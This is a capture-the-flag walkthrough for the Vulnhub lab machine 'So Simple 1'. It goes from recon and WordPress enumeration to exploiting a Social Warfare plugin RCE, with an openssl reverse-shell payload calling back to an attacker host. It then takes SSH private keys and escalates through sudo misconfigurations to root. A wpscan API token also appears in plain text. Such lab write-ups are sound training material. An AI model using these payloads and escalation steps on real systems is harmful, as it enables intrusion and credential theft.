# So Simple 1

---

Machine by [@roelvb79](https://twitter.com/roelvb79)

Vulnhub [link](https://www.vulnhub.com/entry/so-simple-1,515/)

---

## Network scan

nmap the network, find the machine as 192.168.56.111, running a web server and ssh server, no vulnerabilites shown seen.

  
1. Use nmap to scan the network

    We'll use an intense scan on the network as it's quite small (virtualbox host only), we can see web and ssh services running, but no aparent vulnerabilities yet.

    ![victim machine nmap scan result]()




---

---

 
2- attempt to login to ssh, it's key authentication only, this rules out ssh brute force.

3- look into http://192.168.56.111/ on a web browser, couldn't find anything interesting

4- run dirb and we get to know that wordpress is installed

5- create a wpscan account and get api key

6- run "sudo wpscan --api-token BxwwzQ5nrvb34sz235LeWNQQplA4vqr7VBu9WEylbrQ --url http://192.168.56.111/wordpress/ -e" to get information of the wordpress sitem, we know that Social Warfare is installed and on version 3.5.0 is installed and the users "admin" and "max" are created.

7- search for vulnerabilities of social warfare and we find a remote execution vulnerability: "https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/".

8- spin up an apache install, it will contain our payload called "payload.txt" and contain "<pre>system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')</pre>", this will create a connection to our attacker machine on port 4242. (reverse shell command from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl)
9- Start nc with the next options "ncat --ssl -vv -l -p 4242", we will get a reverse shell connection
10- navigate to the max user .ssh folder and get the id_rsa key, we will copy the contents and create a file on our attack machine, we'll call it "key", paste the private key into it, and chmod 600 said file.
11- add the private key with "ssh-add key"
12- ssh into the machine as max with "ssh max@192.168.56.111"
13- once in we can cat the file user.txt and get the first flag
14- using "sudo -l" we'll know what the user has acces to use as root without asking a password, this will return that the user can use /usr/sbin/service.
15- we will use "sudo -u steven /usr/sbin/service ../../bin/bash" this will change to the user steven with the permissions of max /usr/sbin/service and will make sure that we acces the user with /bin/bash as the interpreter.
16- repeat "sudo -l" for user steven, will return a "/opt/tools/server-health.sh" file (non existant), we'll create the folder tools and file server-health.sh. this file will contain: 
#!/bin/bash

bash
17- then we will "chmod +x /opt/tools/server-health.sh"
18- we can use "sudo -u root /opt/tools/server-health.sh" to get root access to the machine.
19- copy the root's ssh private key for direct root access to the machine, and get the flag from inside the root's home folder
